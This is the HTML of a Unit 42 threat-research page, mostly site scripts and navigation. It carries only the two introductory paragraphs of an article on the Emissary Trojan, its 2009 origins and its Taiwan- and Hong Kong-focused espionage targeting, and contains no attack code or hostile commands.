var pvcArgsFrontend = {"mode":"js","postID":12032,"requestURL":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","nonce":"19c0df3ad2","dataStorage":"cookies","multisite":false,"path":"\/","domain":""};
</script>
<script src="https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/js/frontend.min.js?ver=1.4.7" id="post-views-counter-frontend-js"></script>
<script id="wpml-xdomain-data-js-extra">
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en","_nonce":"26f43eef0c"};
</script>
<script src="https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.6.12" id="wpml-xdomain-data-js" defer data-wp-strategy="defer"></script>
<link rel="https://api.w.org/" href="https://unit42.paloaltonetworks.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://unit42.paloaltonetworks.com/wp-json/wp/v2/posts/12032" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=12032' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Femissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Femissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.6.12 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
			padding-top:0px;
			padding-bottom:0px;
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>      <link rel="pingback" href="https://unit42.paloaltonetworks.com/xmlrpc.php"><script src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6"></script>
<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3.0.1/es5/tex-mml-chtml.js"></script>
<link rel="icon" href="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-Unit42-180x180-1.png" sizes="32x32" />
<link rel="icon" href="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-Unit42-180x180-1.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-Unit42-180x180-1.png" />
<meta name="msapplication-TileImage" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-Unit42-180x180-1.png" />
<script>var $ = jQuery;</script>

    <script type="text/javascript">
    ;(function(win, doc, style, timeout) {
    var STYLE_ID = 'at-body-style';
    function getParent() {
    return doc.getElementsByTagName('head')[0];
    }
    function addStyle(parent, id, def) {
        if (!parent) {
        return;
        }
        var style = doc.createElement('style');
        style.id = id;
        style.innerHTML = def;
        parent.appendChild(style);
    }
    function removeStyle(parent, id) {
        if (!parent) {
            return;
        }
        var style = doc.getElementById(id);
        if (!style) {
            return;
        }
        parent.removeChild(style);
    }
    addStyle(getParent(), STYLE_ID, style);
    setTimeout(function() {
    removeStyle(getParent(), STYLE_ID);
    }, timeout);
    }(window, document, "body {visibility:hidden !important}", 3000));
    </script>

            <script src="https://assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
            <script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>


<script type="text/javascript">
var isIE11 = !!navigator.userAgent.match(/Trident.*rv\:11\./);
if(isIE11){
    var polyfill = 'https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/scripts/polyfill.min.js';
    document.write('<script type="text/javascript" src="'+polyfill+'">\x3C/script>');
}
    /**
 * String.prototype.replaceAll() polyfill
 * https://gomakethings.com/how-to-replace-a-section-of-a-string-with-another-one-with-vanilla-js/
 * @author Chris Ferdinandi
 * @license MIT
 */
if (!String.prototype.replaceAll) {
	String.prototype.replaceAll = function(str, newStr){
		// If a regex pattern
		if (Object.prototype.toString.call(str).toLowerCase() === '[object regexp]') {
			return this.replace(str, newStr);
		}
		// If a string
		return this.replace(new RegExp(str, 'g'), newStr);
	};
}

    /*! lozad.js - v1.16.0 - 2020-09-06 */
!function(t,e){"object"==typeof exports&&"undefined"!=typeof module?module.exports=e():"function"==typeof define&&define.amd?define(e):t.lozad=e()}(this,function(){"use strict";
/**
   * Detect IE browser
   * @const {boolean}
   * @private
   */var g="undefined"!=typeof document&&document.documentMode,f={rootMargin:"0px",threshold:0,load:function(t){if("picture"===t.nodeName.toLowerCase()){var e=t.querySelector("img"),r=!1;null===e&&(e=document.createElement("img"),r=!0),g&&t.getAttribute("data-iesrc")&&(e.src=t.getAttribute("data-iesrc")),t.getAttribute("data-alt")&&(e.alt=t.getAttribute("data-alt")),r&&t.append(e)}if("video"===t.nodeName.toLowerCase()&&!t.getAttribute("data-src")&&t.children){for(var a=t.children,o=void 0,i=0;i<=a.length-1;i++)(o=a[i].getAttribute("data-src"))&&(a[i].src=o);t.load()}t.getAttribute("data-poster")&&(t.poster=t.getAttribute("data-poster")),t.getAttribute("data-src")&&(t.src=t.getAttribute("data-src")),t.getAttribute("data-srcset")&&t.setAttribute("srcset",t.getAttribute("data-srcset"));var n=",";if(t.getAttribute("data-background-delimiter")&&(n=t.getAttribute("data-background-delimiter")),t.getAttribute("data-background-image"))t.style.backgroundImage="url('"+t.getAttribute("data-background-image").split(n).join("'),url('")+"')";else if(t.getAttribute("data-background-image-set")){var d=t.getAttribute("data-background-image-set").split(n),u=d[0].substr(0,d[0].indexOf(" "))||d[0];// Substring before ... 1x
u=-1===u.indexOf("url(")?"url("+u+")":u,1===d.length?t.style.backgroundImage=u:t.setAttribute("style",(t.getAttribute("style")||"")+"background-image: "+u+"; background-image: -webkit-image-set("+d+"); background-image: image-set("+d+")")}t.getAttribute("data-toggle-class")&&t.classList.toggle(t.getAttribute("data-toggle-class"))},loaded:function(){}};function A(t){t.setAttribute("data-loaded",!0)}var m=function(t){return"true"===t.getAttribute("data-loaded")},v=function(t){var e=1<arguments.length&&void 0!==arguments[1]?arguments[1]:document;return t instanceof Element?[t]:t instanceof NodeList?t:e.querySelectorAll(t)};return function(){var r,a,o=0<arguments.length&&void 0!==arguments[0]?arguments[0]:".lozad",t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:{},e=Object.assign({},f,t),i=e.root,n=e.rootMargin,d=e.threshold,u=e.load,g=e.loaded,s=void 0;"undefined"!=typeof window&&window.IntersectionObserver&&(s=new IntersectionObserver((r=u,a=g,function(t,e){t.forEach(function(t){(0<t.intersectionRatio||t.isIntersecting)&&(e.unobserve(t.target),m(t.target)||(r(t.target),A(t.target),a(t.target)))})}),{root:i,rootMargin:n,threshold:d}));for(var c,l=v(o,i),b=0;b<l.length;b++)(c=l[b]).getAttribute("data-placeholder-background")&&(c.style.background=c.getAttribute("data-placeholder-background"));return{observe:function(){for(var t=v(o,i),e=0;e<t.length;e++)m(t[e])||(s?s.observe(t[e]):(u(t[e]),A(t[e]),g(t[e])))},triggerLoad:function(t){m(t)||(u(t),A(t),g(t))},observer:s}}});

</script>

<!-- <script src="https://www.google.com/recaptcha/api.js"></script>  -->

<!--  End: Scripts Migrated From Unit42-v5 -->

</head>
<body class="post-template-default single single-post postid-12032 single-format-standard no-sidebar">
<header class="haeder py-15 position-relative z-index-2" style="display: none;">
  <div class="container px-sm-30 px-35">
    <div class="row">
        <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                        <a href="https://www.paloaltonetworks.com/">
                <img src="/wp-content/uploads/2021/07/PANW_Parent.png" width="140px" alt="Logo" />
            </a>
        </div>
      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/">
            <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/unit42-logo-white.svg" class="attachment-full size-full" alt="Unit42 Logo"  width="150" height="35"/>
        </a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search" aria-label="search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required aria-label="Inner Search">
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10"  style="display: none!important;">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-119884" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-119884"><a target="_blank" rel="noopener" href="https://www.paloaltonetworks.com/unit42">Security Consulting</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
<li id="menu-item-121229" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-121229"><a href="https://start.paloaltonetworks.com/contact-unit42.html"><b style="color:#C84727">Under Attack?</b></a></li>
</ul>  </div>
</nav>
<div class="panClean pan-template-home" id="main-nav-menu-cont" style="display:none;">
    <div class="cleanHeader mainNavigationComp baseComponent parbase">
        <div class="productNav2021Component dark default" id="PAN_2021_NAV_ASYNC">
        </div>
  </div>
<div class="cleanTopHtml htmlComp baseComponent parbase"><div class="base-component-spacer spacer-none  "></div>
</div>
</div>
<!--  Start: Scripts Migrated From Unit42-v5 -->
<script type="text/javascript">
	function getCookie(cname) {
	 	var name = cname + "=";
  		var decodedCookie = decodeURIComponent(document.cookie);
		var ca = decodedCookie.split(';');
  		for(var i = 0; i <ca.length; i++) {
    			var c = ca[i];
    			while (c.charAt(0) == ' ') {
     				 c = c.substring(1);
    			}
    			if (c.indexOf(name) == 0) {
    				 return c.substring(name.length, c.length);
    			}
  		}
  		return "";
	}

	var referer = "";//sessionStorage.container;
	var pcontainer = sessionStorage.getItem("container");
	var searchResultsPagePath = "";
	if(((pcontainer) && pcontainer.indexOf('Prisma')!=-1)){
	    referer = 'Prisma' ;
	}
        else if(((pcontainer) && pcontainer.indexOf('Cortex')!=-1)){
	    referer = 'Cortex' ;
	}
        else if(((pcontainer) && pcontainer.indexOf('Sase')!=-1)){
	    referer = 'Sase' ;
	}
	else if(((pcontainer) && pcontainer.indexOf('Unit')!=-1)){
	    referer = 'Unit' ;
	}
	else if(((pcontainer) && pcontainer.indexOf('Ngfw')!=-1)){
	    referer = 'Ngfw' ;
	}
        var fromRef = document.referrer;
        var nContainer = getCookie("navContainer");
        if(nContainer){//If user is coming from main site, we need to reset the container		
		if(fromRef  && fromRef.indexOf("prismacloud.io")!=-1){
                        referer = 'Prisma' ;
                        sessionStorage.setItem("container","Prisma");
                } else if(fromRef.indexOf("paloaltonetworks.com")!=-1 || fromRef.indexOf("paloaltonetworks.jp")!=-1 ){
                        if(nContainer.indexOf('Prisma') != -1){
                            referer = 'Prisma' ;
                            sessionStorage.setItem("container","Prisma");
                        }
                        if(nContainer.indexOf('Cortex') != -1){
                            referer = 'Cortex' ;
                            sessionStorage.setItem("container","Cortex");
                        }
			if(nContainer.indexOf('Sase') != -1){
                            referer = 'Sase' ;
                            sessionStorage.setItem("container","Sase");
                        }
			if(nContainer.indexOf('Unit') != -1){
                            referer = 'Unit' ;
                            sessionStorage.setItem("container","Unit");
                        }
			if(nContainer.indexOf('Ngfw') != -1){
                            referer = 'Ngfw' ;
                            sessionStorage.setItem("container","Ngfw");
                        }
			document.cookie = 'navContainer=; path=/; domain=.paloaltonetworks.com; expires=' + new Date(0).toUTCString();
		}
	}
if(referer != "Prisma" && referer != "Cortex" && referer != "Sase" && referer != "Unit" && referer != "Ngfw") {
    referer = 'Unit' ;
    sessionStorage.setItem("container","Unit");
}
function callMainSitePrismaNavHTML(){
    
    var referrer_domain = 'https://www.paloaltonetworks.com';
    sessionStorage.setItem("domain",referrer_domain);
    if(referer == 'Prisma'){
        var menu_url = referrer_domain+'/_jcr_content/globals/cleanHeaderPrisma.prismaRenderer.html';
        searchResultsPagePath = referrer_domain+"/search/prismasearch";
        }
    if(referer == 'Cortex'){
        var menu_url = referrer_domain+'/_jcr_content/globals/cleanHeaderCortex.cortexRenderer.html';	
        searchResultsPagePath = referrer_domain+"/search/cortexsearch";	
    }
    if(referer == 'Sase'){
        var menu_url = referrer_domain+'/_jcr_content/globals/cleanHeaderSase.saseRenderer.html';
        searchResultsPagePath = referrer_domain+"/search/sasesearch";
    }
    if(referer == 'Unit'){
        var menu_url = 'https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/unit-nav-renderer.php';
        searchResultsPagePath = referrer_domain+"/content/pan/en_US/search/unit42search";
		    }
    if(referer == 'Ngfw'){
        var menu_url = 'https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/ngfw-cdss-nav-renderer.php';
        searchResultsPagePath = referrer_domain+"/search/ngfwcdsssearch";
    }
    httpGet(menu_url,'menu_html');
    document.getElementById('main-nav-menu-cont').removeAttribute("style");
}
function addStyle(styles) {            
    /* Create style document */
    var css = document.createElement('style');
    css.type = 'text/css';

    if (css.styleSheet) 
        css.styleSheet.cssText = styles;
    else 
        css.appendChild(document.createTextNode(styles));

    /* Append style to the tag name */
    document.getElementsByTagName("head")[0].appendChild(css);
}
function httpGet(theUrl,req_type) {
    if (window.XMLHttpRequest) { // code for IE7+, Firefox, Chrome, Opera, Safari
        xmlhttp=new XMLHttpRequest();
    } else {// code for IE6, IE5
        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlhttp.onreadystatechange=function()
    {
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            if(req_type == 'menu_html'){
            var nav_text = xmlhttp.responseText.replaceAll('https://static.cloud.coveo.com/searchui/v2.9159/js/CoveoJsSearch.Lazy.min.js', '');
            nav_text = nav_text.replaceAll('src="/', 'src="'+maindomain_lang+'/');
            nav_text = nav_text.replaceAll("'/content", "'"+maindomain_lang+"/content");
                        
            document.getElementById("PAN_2021_NAV_ASYNC").innerHTML = nav_text.replaceAll('href="/', 'href="'+maindomain_lang+'/');

            var lozad_back = document.getElementsByClassName('lozad-background');
            Array.prototype.forEach.call(lozad_back, function(el) {
            // Do stuff here
            var el_back_img_path = el.getAttribute('data-background-image');
            var first_pos = el_back_img_path.indexOf("'");
            var last_pos = el_back_img_path.indexOf("'",first_pos+1);
            el_back_img_path = el_back_img_path.substring(first_pos+1,last_pos);
            el.setAttribute("data-background-image",main_site_url+el_back_img_path);
            });
            }
            if(req_type == 'head_inline_css'){
            addStyle(xmlhttp.responseText);
            }
        }
    }
    xmlhttp.open("GET", theUrl, true );
    xmlhttp.send();    
}    
    
if(referer == 'Prisma' || referer == 'Cortex' || referer == 'Sase' || referer == 'Unit' || referer == 'Ngfw'){
    const article = document.querySelector('#PAN_2021_NAV_ASYNC');
    if(referer == 'Prisma'){
        article.dataset.type = 'prisma';
        $('#PAN_2021_NAV_ASYNC').removeClass('default').addClass('defaultRedesigned');
    }
    else if(referer == 'Cortex'){
        article.dataset.type = 'cortex';
    }
    else if(referer == 'Sase'){
        article.dataset.type = 'sase';
    }
    else if(referer == 'Unit'){
        article.dataset.type = 'unit';
    }
    else if(referer == 'Ngfw'){
        article.dataset.type = 'ngfw';
    }
    //set class to default
    if(referer == 'Unit' || referer == 'Ngfw'){
        $('#PAN_2021_NAV_ASYNC').removeClass('default').addClass('defaultRedesigned');
    }
    callMainSitePrismaNavHTML();        
}
</script>
<!--  End: Scripts Migrated From Unit42-v5 -->



<main class="main">
    <section class="section section--article">
        <div class="pa article-banner" style="background-image:url('https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/article-banner.jpg')">
          <div class="l-container"> 
            <div class="l-breadcrumbs"> 
              <ul> <li> <a href="https://unit42.paloaltonetworks.com" role="link" title="Threat Research" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:hero:breadcrumb:Threat Research">Threat Research Center</a></li><li><a href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" title="Threat Research" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:hero:breadcrumb:Threat Research">Threat Research</a></li><li class="is-current"><a href="https://unit42.paloaltonetworks.com/category/malware/" role="link" title="Malware" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:hero:breadcrumb:Malware">Malware</a></li> </ul>
            </div>            <div class="ab__title">
              <a class="card-category" href="https://unit42.paloaltonetworks.com/category/malware/" role="link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:hero:Malware"><span class="ab-title__pre">Malware</span></a> 
              <h1>Emissary Trojan Changelog: Did Operation Lotus Blossom Cause It to Evolve?</h1>
              <div class="ab__video">
              <span class="duration"> 
                <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-clock.svg" alt="Clock Icon"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 18</span> <span class="rt-label rt-postfix"></span></span> min read              </span>
                              </div>          
              <div class="ab-lc__wrapper">
                              </div>
            </div>
          </div>
          <div class="ab__footer">
            <div class="l-container">
              <div class="ab__footer-wrapper">
                <ul class="ab__features" role="list">
                  <li role="listitem">
				 <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-profile-grey.svg" alt="Profile Icon">
					 <div class="ab__text"><span>By:</span><ul class="ab__tags"><li><a data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:hero:Robert Falcone" href="https://unit42.paloaltonetworks.com/author/robertfalcone/">Robert Falcone</a></li><li><a data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:hero:Jen Miller-Osborn" href="https://unit42.paloaltonetworks.com/author/jen-miller-osborn/">Jen Miller-Osborn</a></li></ul></div></li>                  <li role="listitem">
			<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-calendar-grey.svg" alt="Published Icon">
			<div class="ab__text"><span>Published:</span>3 February, 2016 at 11:00 AM PST</div></li>					<li role="listitem"><img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-category.svg" alt="Tags Icon"><div class="ab__text"><span>Categories:</span><ul class="ab__tags"><li><a data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:hero:Malware" href="https://unit42.paloaltonetworks.com/category/malware/">Malware</a></li><li><a data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:hero:Threat Research" href="https://unit42.paloaltonetworks.com/category/threat-research/">Threat Research</a></li></ul></div>
		</li>                  <li role="listitem"><img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-tags-grey.svg" alt="Tags Icon"><div class="ab__text"><span>Tags:</span><ul class="ab__tags"><li><a data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:hero:cyber espionage" href="https://unit42.paloaltonetworks.com/tag/cyber-espionage/">Cyber espionage</a></li><li><a data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:hero:cybersecurity" href="https://unit42.paloaltonetworks.com/tag/cybersecurity/">Cybersecurity</a></li><li><a data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:hero:Elise" href="https://unit42.paloaltonetworks.com/tag/elise/">Elise</a></li><li><a data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:hero:Emissary" href="https://unit42.paloaltonetworks.com/tag/emissary/">Emissary</a></li><li><a data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:hero:Espionage" href="https://unit42.paloaltonetworks.com/tag/espionage/">Espionage</a></li><li><a data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:hero:Lotus Blossom" href="https://unit42.paloaltonetworks.com/tag/lotus-blossom/">Lotus Blossom</a></li><li><a data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:hero:Trojans" href="https://unit42.paloaltonetworks.com/tag/trojans/">Trojans</a></li></ul></div>
		</li>                </ul>
                <div class="ab__options">
                  <ul role="list">
                                        <li role="listitem"><a href="https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/?pdf=download&#038;lg=en&#038;_wpnonce=fc7ec9367f" role="link" target="_blank"  title="Click here to download" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:hero:pdfdownload"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-download.svg" alt="Download Icon"></a></li>
                    <li role="listitem"><a href="https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/?pdf=print&#038;lg=en&#038;_wpnonce=fc7ec9367f" target="_blank" role="link" title="Click here to print" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:hero:pdfprint"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-print.svg" alt="Print Icon"></a></li>
                  </ul>
                  
	<div class="ab__share" id="shareDropdown" role="button" aria-expanded="false">
	<a href="#" role="link" title="Click here to share" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:share" class="">Share<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/down-arrow.svg" alt="Down arrow"></a><ul class="share-dropdown" role="menu">
				<li role="menuitem">
					<a href="#" class="copy-url" id="copyUrl" data-url="https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/" role="link" title="Copy link" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:share:link"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-share-link.svg" alt="Link Icon"></a>
				</li>
				<li role="menuitem">
					<a href="mailto:?subject=Emissary%20Trojan%20Changelog:%20Did%20Operation%20Lotus%20Blossom%20Cause%20It%20to%20Evolve?&#038;body=Check%20out%20this%20article%20https%3A%2F%2Funit42.paloaltonetworks.com%2Femissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve%2F" role="link" title="Share in email" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:share:email"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-sms.svg" alt="Link Email"></a>
				</li>
				<li role="menuitem">
					<a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Femissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve%2F" target="_blank" role="link" title="Share in Facebook" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:share:facebook"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-fb-share.svg" alt="Facebook Icon"></a>
				</li>
				<li role="menuitem">
					<a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Femissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve%2F&#038;title=Emissary%20Trojan%20Changelog:%20Did%20Operation%20Lotus%20Blossom%20Cause%20It%20to%20Evolve?" target="_blank" role="link" title="Share in LinkedIn" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:share:linkedin"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-linkedin-share.svg" alt="LinkedIn Icon"></a>
				</li>
				<li role="menuitem">
					<a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Femissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve%2F&#038;text=Emissary%20Trojan%20Changelog:%20Did%20Operation%20Lotus%20Blossom%20Cause%20It%20to%20Evolve?" target="_blank" role="link" title="Share in Twitter" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:share:twitter"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-twitter-share.svg" alt="Twitter Icon"></a>
				</li>
				<li role="menuitem">
					<a href="//www.reddit.com/submit?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Femissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve%2F" target="_blank" role="link" title="Share in Reddit" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:share:reddit"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-reddit-share.svg" alt="Reddit Icon"></a>
				</li>
				<li role="menuitem">
					<a href="https://mastodon.social/share?text=Emissary%20Trojan%20Changelog:%20Did%20Operation%20Lotus%20Blossom%20Cause%20It%20to%20Evolve?%20https%3A%2F%2Funit42.paloaltonetworks.com%2Femissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve%2F" target="_blank" role="link" title="Share in Mastodon" data-page-track="true" data-page-track-value="emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve:share:mastodon"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-mastodon-share.svg" alt="Mastodon Icon"></a>
				</li>
	  </ul>
    </div>                </div>
              </div>
            </div>
          </div>
        </div>
      </section> 
    <section class="section blog-contents"> 
      <div class="pa blog-editor">
        <div class="l-container">
          <div class="be__wrapper">
            <div class="be__contents">
              <div class="be__contents-wrapper">
                <p>In December 2015, Unit 42 <a href="https://blog.paloaltonetworks.com/2015/12/attack-on-french-diplomat-linked-to-operation-lotus-blossom/" target="_blank">published a blog</a> about a cyber espionage attack using the Emissary Trojan as a payload. Emissary is related to the Elise Trojan and the <a href="https://blog.paloaltonetworks.com/2015/06/operation-lotus-blossom/" target="_blank">Operation Lotus Blossom</a> attack campaign, which prompted us to start collecting additional samples of Emissary.</p>
<p>The oldest sample we found was created in 2009, indicating this tool has been in use for almost seven years. Of note, this is three years earlier than the oldest Elise sample we have found, suggesting this group has been active longer than previously documented. In addition, Emissary appears to only be used against Taiwanese or Hong Kong based targets, all of the decoys are written in Traditional Chinese, and they use themes related to the government or military.</p>
<p><span id="more-12032"></span></p>
